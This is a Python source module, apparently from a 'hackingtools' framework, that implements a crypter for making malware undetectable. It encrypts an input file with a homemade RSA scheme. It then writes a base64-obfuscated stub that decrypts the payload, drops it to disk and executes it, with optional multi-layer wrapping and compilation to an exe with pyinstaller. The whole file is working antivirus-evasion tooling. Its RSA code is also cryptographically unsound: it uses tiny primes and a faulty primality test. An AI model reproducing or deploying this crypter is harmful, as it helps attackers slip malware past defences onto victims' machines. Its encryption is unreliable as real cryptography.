from hackingtools.core import Logger, Config

import binascii
import sys
from argparse import ArgumentParser
import os.path
import math
from random import randint
import base64
import binascii
import random
import shutil
config = Config.getConfig(parentKey='modules', key='ht_crypter')

class StartModule():

	def __init__(self):
		Logger.printMessage(message='ht_crypter loaded', debug_module=True)
		pass

	def generate_keypair(self, prime_a, prime_b):
		if not (self.__is_prime__(prime_a) and self.__is_prime__(prime_b)):
			Logger.printMessage(message='{methodName}'.format(methodName='generate_keypair'), description=config['bad_identical_prime'], debug_module=True, is_error=True)
			raise ValueError(config['bad_identical_prime'])
		elif prime_a == prime_b:
			Logger.printMessage(message='{methodName}'.format(methodName='generate_keypair'), description=config['p_q_equal_error'], debug_module=True, is_error=True)
			raise ValueError(config['p_q_equal_error'])
		else:
			#n = pq
			n = prime_a * prime_b

			#Phi is the totient of n
			phi = (prime_a-1) * (prime_b-1)

			#Choose an integer e such that e and phi(n) are coprime
			e = random.randrange(1, phi)

			#Use Euclid's Algorithm to verify that e and phi(n) are comprime
			g = self.__gcd__(e, phi)
			while g != 1:
				e = random.randrange(1, phi)
				g = self.__gcd__(e, phi)

			#Use Extended Euclid's Algorithm to generate the private key
			d = self.__multiplicative_inverse__(e, phi)
			
			#Return public and private keypair
			#Public key is (e, n) and private key is (d, n)
			return ((e, n), (d, n))

	def getRandomKeypair(self, length = 8):
		Logger.printMessage(message='{methodName}'.format(methodName='getRandomKeypair'), debug_module=True)
		prime_a = ''
		prime_b = ''
		while prime_a == prime_b:
			while prime_a == '':
				prime_a = self.__getRandomPrime__(length)
			while prime_b == '':
				prime_b = self.__getRandomPrime__(length)
		return (prime_a, prime_b)
	
	def encrypt(self, private_key, plaintext):
		Logger.printMessage(message='{methodName}'.format(methodName='encrypt'), description='{private_key} - {msg}'.format(private_key=private_key, msg=plaintext[0:10]), debug_module=True)
		#Unpack the key into it's components
		key, n = private_key
		ba64 = base64.b64encode(plaintext)
		ashex = self.__ASCII_Hex__(ba64)
		hexba64 = self.__Hex_Base64__(ashex)
		ba64un = self.__unirBase64__(hexba64)
		decasc = self.__decimal_ASCII__(ba64un)
		mensaje = self.__mensajeASCII__(decasc)
		mensaje1 = [(ord(chr(char)) ** key) % n for char in mensaje]
		mensajeHex = self.__ASCII_Hex__(mensaje1)
		mensajeBase64 = self.__Hex_Base64__(mensajeHex)
		mensajeFinalBase64 = self.__unirBase64__(mensajeBase64)
		return mensajeFinalBase64.decode("utf-8")

	def decrypt(self, public_key, ciphertext):
		Logger.printMessage(message='{methodName}'.format(methodName='decrypt'), description='{public_key}'.format(public_key=public_key), debug_module=True)
		#Unpack the key into its components
		key, n = public_key
		mensajeRecibido = self.__recibirBase64__(ciphertext.encode('utf-8'))
		mensajeHexRecibido = self.__Base64_Hex__(mensajeRecibido)
		mensajeDecimalRecibido = self.__Hex_decimal__(mensajeHexRecibido)
		mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
		mensaje_de_ascii = self.__decimal_ASCII__(mensajeDescifrado)
		decasc = self.__recibirBase64__(''.join(mensaje_de_ascii).encode())
		hexba64 = self.__Base64_Hex__(decasc)
		ashex = self.__Hex_decimal__(hexba64)
		deasc = self.__decimal_ASCII__(ashex)
		ba64 = base64.b64decode(deasc.encode())
		return ba64

	def __gcd__(self, a, b):
		'''
		Euclid's algorithm for determining the greatest common divisor
		Use iteration to make it faster for larger integers
		'''
		while b != 0:
			a, b = b, a % b
		return a

	def __multiplicative_inverse__(self, e, phi):
		'''
		Euclid's extended algorithm for finding the multiplicative inverse of two numbers
		'''
		# See: http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm
		def eea(a,b):
			if b==0:return (1,0)
			(q,r) = (a//b,a%b)
			(s,t) = eea(b,r)
			return (t, s-(q*t) )

		inv = eea(e,phi)[0]
		if inv < 1: inv += phi #we only want positive values
		return inv
	
	def __is_prime__(self, primo):
		'''
		Tests to see if a number is prime.
		'''
		excluidos = (0, 2, 4, 5, 6, 8)
		if not int(str(primo)[-1]) in excluidos:
			division = 0
			try:
				mitad = primo/2
				if not isinstance(mitad, float):
					return False
			except:
				return False
			fibo_1 = 0
			fibo_2 = 1
			fibo_temp = fibo_1 + fibo_2
			while fibo_temp < int(primo/2):
				if primo % fibo_temp == 0:
					division += 1
				fibo_1 = fibo_2
				fibo_2 = fibo_temp
				fibo_temp = fibo_1 + fibo_2
				if division == 2:
					return False
			if division == 1:
				return True

	def __mensajeASCII__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__mensajeASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		men = [ord(pal) for pal in mensaje]
		#men = []
		#for palabra in mensaje:
		#	men.append(ord(palabra))
		return men

	def __ASCII_Hex__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__ASCII_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		mensajeHex = [hex(numero)[2:] for numero in mensaje]
		#mensajeHex = []
		#for numero in mensaje:
		#	mensajeHex.append(hex(numero)[2:])
		return mensajeHex

	def __Hex_Base64__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_Base64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		mensajeBase64 = [base64.b64encode(numero.encode()) for numero in mensaje]
		#mensajeBase64 = []
		#for numero in mensaje:
		#	mensajeBase64.append(base64.b64encode(numero.encode()))
		return mensajeBase64

	def __unirBase64__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		msg_base64 = ''.join([mensaje[i].decode('utf-8') for i in range(0, len(mensaje))])
		#msg_base64 = "".encode()
		#for i in range(0, len(mensaje)):
		#	msg_base64 = msg_base64 + mensaje[i]
		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='{msg_base64} ...'.format(msg_base64=msg_base64[0:10]), debug_module=True)
		return msg_base64.encode()

	def __recibirBase64__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__recibirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		msg_base64 = [mensaje[i:i+4] for i in range(0, len(mensaje), 4)]
		#msg_base64 = []
		#for i in range(0,len(mensaje), 4):
		#	msg_base64.append(mensaje[i:i+4])
		return msg_base64
		
	def __Base64_Hex__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__Base64_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		mensajeHex = [base64.b64decode(b64) for b64 in mensaje]
		#mensajeHex = []
		#for b64 in mensaje:
		#	mensajeHex.append(base64.b64decode(b64))
		return mensajeHex

	def __Hex_decimal__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_decimal__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		mensajeDecimal = [int(hexa.decode("UTF-8"), 16) for hexa in mensaje]
		#mensajeDecimal = []
		#for hexa in mensaje:
		#	hexa = hexa.decode("UTF-8")
		#	numero = int(hexa, 16)
		#	mensajeDecimal.append(numero)    
		return mensajeDecimal

	def __decimal_ASCII__(self, mensaje):
		Logger.printMessage(message='{methodName}'.format(methodName='__decimal_ASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
		mensaje1 = ''.join([chr(decimal) for decimal in mensaje])
		#for decimal in mensaje:
		#	mensaje1 = mensaje1 + chr(decimal)
		return mensaje1

	def __getRandomPrime__(self, length = 8):
		prime = 0
		while True:
			primo=random.randint(10**(length-1), 10**length)
			if self.__is_prime__(primo):
				return primo

	# FIN RSA

	def getMalwareData(self, fileName):
		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
		file = open(fileName, "rb")
		file_data = file.read()
		file.close()
		return file_data

	def convertToExe(self, stub_name):
		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
		# Convert py to exe with pyinstaller
		import os
		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
		filename = '{file}.exe'.format(file=stub_name.split('.')[0].split('\\')[-1])

		file_to_move = os.path.abspath(os.path.join('dist', '{file}'.format(file=filename)))
		new_file = os.path.abspath(os.path.join(os.path.dirname(stub_name), filename))

		if os.path.isfile(file_to_move) and not os.path.isfile(new_file):
			os.rename(file_to_move, new_file)

		new_spec_file = '{name}.spec'.format(name=new_file.split('.')[0])
		if os.path.isfile(new_spec_file):
			os.remove(new_spec_file)

		build_dir = os.path.abspath(os.path.join('build', '{file}'.format(file=filename.split('.')[0])))
		if os.path.isdir(build_dir):
			shutil.rmtree(build_dir)

		if os.path.isfile(file_to_move):
			os.remove(file_to_move)

		spec_file = os.path.abspath('{file}.spec'.format(file=filename.split('.')[0]))
		if os.path.isfile(spec_file):
			os.remove(spec_file)

	def is_valid_file(self, parser, arg):
		if not os.path.exists(arg):
			parser.error("The file {file} does not exist!".format(file=arg))
		else:
			return arg

	def clean_output_dir(self):
		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
		if os.path.isdir(output_dir):
			shutil.rmtree(output_dir)

	def saveStub(self, stub, save_name, print_save_stub=True):
		# Save the Stub
		stub_name = save_name
		stub_file = open(stub_name, "w")
		stub_file.write(stub)
		stub_file.close()
		if print_save_stub:
			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)

	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
		# Create Stub in Python File
		stub = ''
		if is_last:
			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "drpnm = \"" + drop_file_name + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += """
def dcy(pk, cptx):
	k, n = pk
	mensajeRecibido = __reBa64__(cptx.encode('utf-8'))
	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)
	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]
	mensaje_de_ascii = __deAS__(mensajeDescifrado)
	decasc = __reBa64__(''.join(mensaje_de_ascii).encode())
	hexba64 = __ba64Hex__(decasc)
	ashex = __hexDec__(hexba64)
	deasc = __deAS__(ashex)
	ba64 = base64.b64decode(deasc.encode())
	return ba64
def __reBa64__(m):
	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]
	return mBa64
def __ba64Hex__(m):
	mHx = [base64.b64decode(b64) for b64 in m]
	return mHx
def __hexDec__(m):
	mDec = [int(hexa.decode("UTF-8"), 16) for hexa in m]
	return mDec
def __deAS__(m):
	m1 = ''.join([chr(d) for d in m])
	return m1
def __meAS__(m):
	men = [ord(p) for p in m]
	return men
dcy_data = dcy(pk=pk, cptx=cdx)
"""
		if is_iterating:
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\n"
			stub += "exec(dcy_data)"
		else:
			stub += """
image_extensions = ('jpg', 'jpeg', 'bpm', 'ico', 'png')
exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
python_extensions = ('py')
nf = open(drpnm, 'wb')
try:
	nf.write(dcy_data)
except:
	pass
nf.close()
if os.path.exists(drpnm):
	if drpnm.split('.')[1] in image_extensions:
		imageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
	if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
		os.system(drpnm)
	if drpnm.split('.')[1] in python_extensions:
		exec(dcy_data)
		proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""

		stub_base64 = base64.b64encode(stub.encode('utf-8'))
		stub = "import base64\n"
		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
		stub += "exec(base64.b64decode(data))"
		
		self.saveStub(stub, save_name, print_save_stub)

		if convert:
			self.convertToExe(save_name)

	def crypt_file(self, filename, new_file_name, drop_file_name, is_iterating=False, prime_length=8, iterate_count=1, is_last=False, print_save_stub=True, compile_exe=False):
		"""
		filename es el archivo original a indetectar (filename='servidor.py')
		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
		drop_file_name es el nombre con el que se guarda trás ejecutarse el stub para poder ejecutarlo (drop_file_name='descifrado_ejecutable.py')
		compile_exe es si queremos compilarlo con pyinstaller
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
		temp_filename = filename
		if iterate_count > 1:
			temp_filename = filename
			for i in range(1, iterate_count):
				if i == iterate_count - 1:
					is_last = True
				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, is_iterating=True, iterate_count=1, is_last=is_last, print_save_stub=False, compile_exe=False)
		
		filename = temp_filename
		if filename and new_file_name:
			data = self.getMalwareData(filename)
			prime_a, prime_b = self.getRandomKeypair(prime_length)
			public, private = self.generate_keypair(prime_a, prime_b)
			crypted_data = self.encrypt(private_key=private, plaintext=data)
			new_file = new_file_name
			if not '.' in new_file:
				new_file = '{file}.py'.format(file=new_file)

			if compile_exe:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last, convert=True)
				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
			else:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last)
			return new_file
		else:
			return None